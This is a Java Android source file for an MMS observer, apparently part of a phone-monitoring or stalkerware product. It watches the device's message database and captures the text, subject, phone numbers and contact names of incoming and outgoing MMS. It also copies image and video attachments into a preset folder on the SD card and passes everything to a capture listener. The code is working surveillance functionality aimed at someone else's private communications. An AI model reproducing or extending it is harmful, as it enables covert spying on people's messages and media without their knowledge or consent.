package com.vvt.mms;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.net.Uri;

import com.vvt.calendar.CalendarObserver;
import com.vvt.contacts.ContactsDatabaseManager;
import com.vvt.contentobserver.IDaemonContentObserver;
import com.vvt.dbobserver.WriteReadFile;
import com.vvt.ioutil.FileUtil;
import com.vvt.logger.FxLog;

public class MmsObserver extends IDaemonContentObserver {
	
	private static final String TAG = "MmsObserver";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	private static final String DEFAULT_PATH = "/sdcard/data/data/com.vvt.im";
	private static final String LOG_FILE_NAME = "mms.ref";
	
	private static MmsObserver sInstance;
	
	private CalendarObserver mCalendarObserver;
	private OnCaptureListener mListener;
	private SimpleDateFormat mDateFormatter;
	private String mLoggablePath;
	
	public static MmsObserver getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new MmsObserver(context);
		}
		return sInstance;
	}

	private MmsObserver(Context context) {
		super(context);
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		
		mDateFormatter = new SimpleDateFormat(DEFAULT_DATE_FORMAT);
		
		mLoggablePath = DEFAULT_PATH;
	}
	
	public void setLoggablePath(String path) {
		mLoggablePath = path;
	}
	
	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}
	
	public void registerObserver(OnCaptureListener listener) {
		long refId = MmsDatabaseManager.getLatestMmsId();
		setRefId(refId);
		
		if(LOGV) FxLog.v(TAG, String.format("registerObserver # refId: %d", refId));
		
		mListener = listener;
		super.registerObserver();
	}
	
	public void unregisterObserver(OnCaptureListener listener) {
		mListener = null;
		super.unregisterObserver();
	}

	@Override
	protected void onContentChange() {
		if(LOGV) FxLog.v(TAG, "onContentChange # ENTER ...");
		
		long refId = getRefId();
		if(LOGV) FxLog.v(TAG, "onContentChange # refId : " + refId);
		
		long latestId = MmsDatabaseManager.getLatestMmsId();
		if (latestId == refId) {
			if(LOGV) FxLog.v(TAG, "onContentChange # Latest ID is not changed!!");
		}
		else if (latestId < refId) {
			if(LOGD) FxLog.d(TAG, "onContentChange # Found changes, update mRefId");
			setRefId(latestId);
		}
		else {
			if(LOGD) FxLog.d(TAG, "onContentChange # Found changes, latestId > refId, update mRefId");
			ArrayList<MmsData> mmses = getNewerMms(refId);
			
			if (mmses == null || mmses.size() == 0) {
				if(LOGD) FxLog.d(TAG, "onContentChange # No new event found!! -> EXIT ...");
				return;
			}
			
			if (mListener != null) {
				mListener.onCapture(mmses);
			}
		}
		
		if(LOGV) FxLog.v(TAG, "onContentChange # EXIT ...");
	}

	@Override
	protected Uri getContentUri() {
		return Uri.parse("content://mms-sms");
	}

	@Override
	protected String getTag() {
		return TAG;
	}
	
	private synchronized ArrayList<MmsData> getNewerMms(long refId) {
		if(LOGV) FxLog.v(TAG, "getNewerMms # ENTER ...");
		
		ArrayList<MmsData> mmses = new ArrayList<MmsData>();
		
		SQLiteDatabase db = MmsDatabaseHelper.getReadableDatabase();
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(LOGW) FxLog.w(TAG, "getNewerMms # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			return mmses;
		}
		
		Cursor cursor = null;
		try {
			
			
			// Type can tell direction and readiness of MMS
			// 1: IN, 2: OUT, 4: SENDING
			String selection = String.format(
					"(%s = %d OR %s = %d) AND %s > %d",
					MmsDatabaseHelper.COLUMN_MSG_BOX,
					MmsDatabaseHelper.MESSAGE_TYPE_INBOX,
					MmsDatabaseHelper.COLUMN_MSG_BOX,
					MmsDatabaseHelper.MESSAGE_TYPE_OUTBOX,
					MmsDatabaseHelper.COLUMN_ID, refId);

			cursor = db.query(MmsDatabaseHelper.TABLE_PDU, 
					null, selection, null, null, null, null);

			if (cursor == null) {
				return mmses;
			}
		}
		catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, String.format("getNewerMms # %s", e.toString()));
		}
		
		if (cursor == null) {
			if(LOGW) FxLog.w(TAG, "getNewerMms # Query database FAILED!! -> EXIT ...");
			db.close();
			return mmses;
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerMms # Begin query");
		
		mDateFormatter.setTimeZone(
				TimeZone.getTimeZone(
						mCalendarObserver.getLocalTimeZone()));
		
		MmsData mms = null;
		
		while (cursor.moveToNext()) {
			
			String subject = cursor.getString(cursor
					.getColumnIndex(MmsDatabaseHelper.COLUMN_SUBJECT));

			if (subject == null)
				subject = "";
			else
				try {
					subject = new String(subject.getBytes("ISO-8859-1"),"UTF-8");
				} catch (UnsupportedEncodingException e) {
					subject = "unknown";
					if(LOGE) FxLog.e(TAG, e.getMessage(), e);
				}

			int id = Integer.parseInt(cursor.getString(cursor
					.getColumnIndex(MmsDatabaseHelper.COLUMN_ID)));
			if(LOGV) FxLog.v(TAG, "onContentChange # refId : " + refId+ " id : "+id);
			if (id > refId) refId = id;

			// for some reason date coming here is wrong. so I set it to the
			// mobile phone date time
			// long date = cursor.getLong(cursor.getColumnIndex
			// (MmsSmsDatabaseHelper.COLUMN_DATE));
			long date = new Date().getTime();

			ArrayList<MmsAttachment> attachments = new ArrayList<MmsAttachment>();
			String message = "";
			List<MmsRecipient> recipients = new ArrayList<MmsRecipient>();
			List<String> addressLists = new ArrayList<String>();
			String address = "";
			boolean isIncoming;
			String fileName;
			byte[] imgData = null;

			int type = Integer.parseInt(cursor.getString(cursor
					.getColumnIndex(MmsDatabaseHelper.COLUMN_M_TYPE)));
			if (type == 128) {
				isIncoming = false;
			} else {
				isIncoming = true;
			}
			
			// Get Parts
			String selection = "mid = " + id;

			Cursor curPart = db.query(MmsDatabaseHelper.TABLE_PART, 
					null, selection, null, null, null,  MmsDatabaseHelper.COLUMN_ID);
			
			if (curPart.getCount() <= 0)
				continue;
			
			curPart.moveToLast();
			do {
				String contentType = curPart
						.getString(curPart
								.getColumnIndex(MmsDatabaseHelper.COLUMN_CONTENT_TYPE));
				String partId = curPart.getString(curPart
						.getColumnIndex(MmsDatabaseHelper.COLUMN_ID));

				// Get the message
				if (contentType.equalsIgnoreCase("text/plain")) {
					message = curPart.getString(curPart
							.getColumnIndex(MmsDatabaseHelper.COLUMN_TEXT));
					if(message == null) {
						message = "";
					}

				} else if (MmsUtil.isImageType(contentType) == true) {
					// Get Image
					fileName = new StringBuilder().append("mms_")
							.append(partId).append(".jpg").toString();
					
					String imagePath = curPart.getString(curPart
							.getColumnIndex(MmsDatabaseHelper.COLUMN_DATA_PATH));
					
					imgData = new byte[] {};
					if (imagePath != null) {
						File file = new File(imagePath);
						if (file.exists()) {
							imgData = FileUtil.readFileData(imagePath);
						}
					}

					String fullPath = MmsUtil.getFullPath(mLoggablePath, fileName);
					MmsUtil.writeDataToFile(imgData, fullPath);
					
					MmsAttachment attachment = new MmsAttachment();
					attachment.setAttachemntFullName(fullPath);
					attachment.setAttachmentData(imgData);
					attachments.add(attachment);
				} else if (MmsUtil.isVideoType(contentType) == true) {
					fileName = new StringBuilder().append("video_")
							.append(partId).append(".3gpp").toString();
					
					String videoPath = curPart.getString(curPart
							.getColumnIndex(MmsDatabaseHelper.COLUMN_DATA_PATH));
					
					imgData = new byte[] {};
					if (videoPath != null) {
						File file = new File(videoPath);
						if (file.exists()) {
							imgData = FileUtil.readFileData(videoPath);
						}
					}

					String fullPath = MmsUtil.getFullPath(mLoggablePath, fileName);
					MmsUtil.writeDataToFile(imgData, fullPath);
					
					MmsAttachment attachment = new MmsAttachment();
					attachment.setAttachemntFullName(fullPath);
					attachment.setAttachmentData(imgData);
					attachments.add(attachment);
				}

			} while (curPart.moveToPrevious());
			
			// Get Address
			String selection_addr = String.format("%s = %s AND %s = 137",
					MmsDatabaseHelper.COLUMN_MSG_ID, id,MmsDatabaseHelper.COLUMN_TYPE) ;

			Cursor addrCur = db.query(MmsDatabaseHelper.TABLE_ADDR, 
					null, selection_addr, null, null, null,  MmsDatabaseHelper.COLUMN_ID);
			
			if (addrCur != null && addrCur.getCount() > 0) {
				try {
					addrCur.moveToLast();
					do {
						int addColIndx = addrCur.getColumnIndex("address");
						address = addrCur.getString(addColIndx);
					} while (addrCur.moveToPrevious());
				} finally {
					addrCur.close();
				}
			}
			
			//out going 
			if (address.contentEquals("insert-address-token") || address.trim().length() <0 ) {
				final String[] projection = new String[] { "address" };
				selection_addr = String.format("%s = %s AND %s = 151",
						MmsDatabaseHelper.COLUMN_MSG_ID, id,MmsDatabaseHelper.COLUMN_TYPE) ;
				Cursor addrCur2 = db.query(MmsDatabaseHelper.TABLE_ADDR, 
						projection, selection_addr, null, null, null,  MmsDatabaseHelper.COLUMN_ID);
				
				if (addrCur2 != null) {
					try {
						addrCur2.moveToLast();
						do {
							int addColIndx = addrCur2.getColumnIndex("address");
							addressLists.add(addrCur2.getString(addColIndx));
						} while (addrCur2.moveToPrevious());
					} finally {
						addrCur2.close();
					}
				}
			} else {
				addressLists.add(address);
			}
			
			if(!isIncoming) {
				MmsRecipient mmsRecipient = null;
				String contactName = "";
				for(String addr : addressLists) {
					mmsRecipient = new MmsRecipient();
					contactName =  ContactsDatabaseManager.getContactNameByPhone(addr);
					if (contactName == null || contactName.trim().length() < 1) {
						contactName = "unknown";
						mmsRecipient.setContactName(contactName);
						mmsRecipient.setRecipient(addr);
						
					} else {
						mmsRecipient.setContactName(contactName);
						mmsRecipient.setRecipient(addr);
					}
					recipients.add(mmsRecipient);
				}
			}
			
			String contactName = "unknown";
			
			if(addressLists.size() > 0) {
				contactName = ContactsDatabaseManager.getContactNameByPhone(addressLists.get(0));
				if (contactName == null || contactName.trim().length() < 1) {
					contactName = "unknown";
				}
			}
			
			mms = new MmsData();
			//TODO : need to change to pass only long do not change Date format.
//			mms.setTime(mDateFormatter.format(new Date(time)));
			mms.setTime(date);
			mms.setIncoming(isIncoming);
			if(isIncoming) {
				if(addressLists.size() > 0) {
					mms.setSenderNumber(addressLists.get(0));
				}
			} else {
				mms.setSenderNumber("unknown");
			}
			mms.setContactName(contactName);
			mms.setData(message);
			mms.setAttachments(attachments);
			mms.setRecipients(recipients);
			mms.setSubject(subject);
			mmses.add(mms);
			
			if(LOGV) FxLog.v(TAG, String.format("getNewerMms # Capture %s", mms));
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerMms # Update refId");
		setRefId(refId);
		
		cursor.close();
		db.close();
		
		if(LOGV) FxLog.v(TAG, "getNewerMms # EXIT ...");
		return mmses;
	}

	private void setRefId(long refId){
		String fullPath = MmsUtil.getFullPath(mLoggablePath, LOG_FILE_NAME);
		WriteReadFile.writeFile(fullPath, String.valueOf(refId));
	}
	
	private long getRefId(){
		String fullPath = MmsUtil.getFullPath(mLoggablePath, LOG_FILE_NAME);
		String refId = WriteReadFile.readFile(fullPath);
		return Long.parseLong(refId);
	}
	
	public static interface OnCaptureListener {
		public void onCapture(ArrayList<MmsData> mmses);
	}

}
